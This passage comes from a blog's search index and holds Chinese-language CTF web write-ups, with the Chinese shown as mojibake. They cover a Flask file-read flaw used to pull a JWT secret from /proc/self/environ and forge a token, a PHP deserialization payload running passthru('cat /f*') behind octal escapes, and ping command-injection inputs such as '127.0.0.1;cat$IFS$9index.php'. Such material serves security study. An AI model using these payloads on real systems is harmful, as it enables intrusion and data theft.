class="number">400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api-base/v0/logout&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    response = jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Logout successful!&#x27;</span>&#125;)</span><br><span class="line">    response.delete_cookie(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api-base/v0/search&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@auth</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">api</span>():</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;file&#x27;</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(request.args.get(<span class="string">&#x27;file&#x27;</span>), <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">                data = file.read()</span><br><span class="line">            <span class="keyword">return</span> render_template_string(data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;File not found&#x27;</span>, <span class="number">404</span></span><br><span class="line">        <span class="keyword">except</span> jwt.ExpiredSignatureError:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">        <span class="keyword">except</span> jwt.InvalidTokenError:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;something error?&#x27;</span>, <span class="number">500</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(response2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MemUser</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">setUser</span>(<span class="params">self, username, password</span>):</span><br><span class="line">        <span class="variable language_">self</span>.username = username</span><br><span class="line">        <span class="variable language_">self</span>.password = password</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">setToken</span>(<span class="params">self, token</span>):</span><br><span class="line">        <span class="variable language_">self</span>.token = token</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.username = <span class="string">&quot;admin&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.password = <span class="string">&quot;password&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.token = jwt.encode(&#123;<span class="string">&#x27;username&#x27;</span>: <span class="variable language_">self</span>.username, <span class="string">&#x27;password&#x27;</span>: <span class="variable language_">self</span>.password&#125;, app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>], algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    User = MemUser()</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure><p>æ‰¾åˆ°adminçš„ä¿¡æ¯äº† , {â€œusernameâ€:â€adminâ€ , â€œpasswordâ€:â€passwordâ€} å†&#x2F;readflag</p><p>åªè¦ç”¨æˆ·åæ˜¯Plato å¯†ç æ˜¯ideal_state å°±å¯ä»¥å¾—åˆ°flagï¼Œä½†æ˜¯å®ƒæ— æ³•ç™»å½•ï¼Œä¹Ÿæ— æ³•æ³¨å†Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.json[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">&quot;Plato&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Your wisdom is not sufficient to be called a sage.&#x27;</span>, <span class="number">401</span></span><br><span class="line">        password = request.json[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        User.setUser(username, password)</span><br><span class="line">        token = jwt.encode(&#123;<span class="string">&#x27;username&#x27;</span>: username, <span class="string">&#x27;password&#x27;</span>: password&#125;, app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>], algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line">        User.setToken(token)</span><br><span class="line">        <span class="keyword">return</span> jsonify(response1)</span><br><span class="line">    <span class="keyword">return</span> jsonify(response2), <span class="number">400</span></span><br></pre></td></tr></table></figure><p>è¦ç›®å½•ç©¿é€?a&#x3D;..&#x2F;..&#x2F;..&#x2F;???????</p><img src="11d98589587d850441e418378bf25e39.png" alt="11d98589587d850441e418378bf25e39.png" /><p>ç•™æ„ä¸€ä¸‹é€™ä¸€å¥:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = os.environ.get(<span class="string">&#x27;SECRET_KEY&#x27;</span>)</span><br></pre></td></tr></table></figure><p>é€™ä¸€å¥æ˜¯æŒ‡åœ¨linuxä¸‹çš„&#x2F;proc&#x2F;self&#x2F;environæœ‰æ”¾key , å¯ä»¥åœ¨?file&#x3D; &#x2F;proc&#x2F;self&#x2F;environæ‰¾åˆ°</p><p>æœ€å¾Œåœ¨&#x2F;proc&#x2F;self&#x2F;environ æ‰¾åˆ°äº†KEY</p><img src="5643d3d71c222dfc43591b4449fed24c.png" alt="5643d3d71c222dfc43591b4449fed24c.png" /><p>SECRET_KEY&#x3D;B3@uTy_L1es_IN_7he_EyEs_0f_Th3_BEh0ld3r</p><p>é€™æ¨£å°±å¯ä»¥jwtå½é€ äº† , </p><img src="1b29cf97eba9760613949894d4a72e3f.png" alt="1b29cf97eba9760613949894d4a72e3f.png" /><p>ç°¡å–®å¯«ä¸€ä¸‹:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">SECRET_KEY = <span class="string">&#x27;B3@uTy_L1es_IN_7he_EyEs_0f_Th3_BEh0ld3r&#x27;</span></span><br><span class="line">username = <span class="string">&#x27;Plato&#x27;</span></span><br><span class="line">password = <span class="string">&#x27;ideal_state&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”Ÿæˆtoken</span></span><br><span class="line">token = jwt.encode(&#123;<span class="string">&#x27;username&#x27;</span>: username, <span class="string">&#x27;password&#x27;</span>: password&#125;, SECRET_KEY, algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(token)</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlBsYXRvIiwicGFzc3dvcmQiOiJpZGVhbF9zdGF0ZSJ9.LpctUZCUocsntlZ7kNWh9KsagP4CMcELs_bt1g_4A-M</span><br></pre></td></tr></table></figure><h2 id="29-Maxser-Revenge"><a href="#29-Maxser-Revenge" class="headerlink" title="29.Maxser Revenge"></a>29.Maxser Revenge</h2><p>æ˜¯ä¸€å€‹php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;check.php&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">passthru</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$S</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dir</span>;</span><br><span class="line">      <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;dir=<span class="string">&#x27;notion&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;S);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;NSS&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">check</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line">æ¥å§ï¼Œæ¹®ç­æé™!</span><br></pre></td></tr></table></figure><p>æ˜¯ä¸€å€‹ååºåˆ—åŒ–php </p><p>ä¾†æ‰“é–‹phpstudy ç”Ÿæˆ NSSçš„åƒæ•¸</p><p>ç›®æ¨™æ˜¯eval(system(â€œls &#x2F;â€œ))</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">passthru</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$S</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dir</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">passthru</span>() ;</span><br><span class="line"><span class="variable">$a</span>-&gt;S = <span class="string">&quot;system(&#x27;ls /&#x27;)&quot;</span> ;</span><br><span class="line"></span><br><span class="line"><span class="comment">#echo serialize($a) ;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)) ;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="2ba80e6f30589677a856d9ad50d69064.png" alt="2ba80e6f30589677a856d9ad50d69064.png" /><p>å‘ç°æœ‰æ­£åˆ™ç»•è¿‡â€œ&#x2F;[A-Za-z_$()]+&#x2F;â€ éœ€è¦è¿‡æ»¤å­—æ¯:</p><p>16é€²åˆ¶è½‰æ–‡æœ¬:<br><img src="572046fd972c87d3ee5775239a1d7d79.png" alt="572046fd972c87d3ee5775239a1d7d79.png" /></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:8:&quot;passthru&quot;:2:&#123;s:1:&quot;S&quot;;s:14:\x73\x79\x73\x74\x65\x6d\x28\x27\x6c\x73\x20\x2f\x27\x29;s:3:&quot;dir&quot;;N;&#125;</span><br></pre></td></tr></table></figure><p>hexé‚„æ˜¯å­—æ¯ , </p><p>çœ‹äº†çœ‹å…¶ä»–å¸«å‚…çš„wp , passthruå¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œ , lsä¸­lè½¬16è¿›åˆ¶ä¸è¡Œ å°±ç›´æ¥cat &#x2F;f*</p><p>(&#x2F;å’Œå¯ä»¥ç›´æ¥ç”¨ï¼Œä¸ç”¨è½¬16è¿›åˆ¶)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\70\61\73\73\74\68\72\75\28\27\63\61\74\20/\66*\27\29;</span><br></pre></td></tr></table></figure><img src="a4785abc923a2e43feb01011e377f5d4.png" alt="a4785abc923a2e43feb01011e377f5d4.png" /><p>æ„é€ payload,è®°å¾—s:19:è¦æ”¹ä¸ºS:19:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">passthru</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$S</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dir</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">passthru</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;S = <span class="string">&quot;passthru(&#x27;cat /f*&#x27;);&quot;</span> ;</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#echo  base64_encode(serialize($a));</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">O:<span class="number">8</span>:<span class="string">&quot;passthru&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;S&quot;</span>;S:<span class="number">20</span>:<span class="string">&quot;\70\61\73\73\74\68\72\75\28\27\63\61\74\20/\66*\27\29;&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;dir&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure><img src="25f376dd0b5cc047ca0951ac84059a34.png" alt="25f376dd0b5cc047ca0951ac84059a34.png" /><h2 id="30-Ping-Ping-Ping"><a href="#30-Ping-Ping-Ping" class="headerlink" title="30.Ping Ping Ping"></a>30.Ping Ping Ping</h2><img src="349142a23ffb190571f209f91cd0f173.png" alt="349142a23ffb190571f209f91cd0f173.png" /><img src="ceba1696d51eae85a3820a0d00ef3ab3.png" alt="ceba1696d51eae85a3820a0d00ef3ab3.png" /><p>ç©ºæ ¼å’Œflagè¢«banäº†</p><img src="5ce731b01dcdbd163cf01d3cfd2fff87.png" alt="5ce731b01dcdbd163cf01d3cfd2fff87.png" /><p>symbolè¢«banäº† , </p><p>127.0.0.1|ls</p><img src="d5fbcd5e74f7beb3f974da2202f2b978.png" alt="d5fbcd5e74f7beb3f974da2202f2b978.png" /><p>ç”¨$IFSä»£æ›¿ç©ºæ ¼  </p><p>$9 ä»£æ›¿ &#x2F;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;cat$IFS$9index.php</span><br></pre></td></tr></table></figure><img src="224ce82d74ce207b444dab02cc62293d.png" alt="224ce82d74ce207b444dab02cc62293d.png" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;q=g;cat$IFS$9fla$q.php</span><br></pre></td></tr></table></figure><img src="42eab3f9433044da14d296dd6bb8f8e3.png" alt="42eab3f9433044da14d296dd6bb8f8e3.png" />]]></content>
      
      
      <categories>
          
          <category> WEB </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
